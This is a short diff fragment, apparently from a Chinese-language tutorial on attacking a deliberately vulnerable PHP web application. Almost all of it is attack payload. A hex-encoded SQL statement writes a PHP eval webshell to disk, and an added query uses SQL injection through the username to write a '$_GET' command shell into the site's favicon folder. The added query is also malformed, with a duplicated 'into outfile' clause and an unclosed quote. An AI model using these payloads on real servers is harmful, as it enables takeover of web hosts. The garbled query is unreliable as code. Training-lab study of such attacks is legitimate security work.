@@ -220,6 +220,7 @@ select 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into
 
 ```
 $sql = "SELECT * FROM dwvs_user_message WHERE DWVS_user_name ="."'{$_SESSION['user_name']}'";
+$sql = "SELECT * FROM dwvs_user_message WHERE DWVS_user_name ='<?=$_GET[c];?>'into outfile'/var/www/html/favicon/c1.php ' into outfile '/var/www/html/favicon/c1.php';
 ```
 
 就会将我们的shell写入账号。
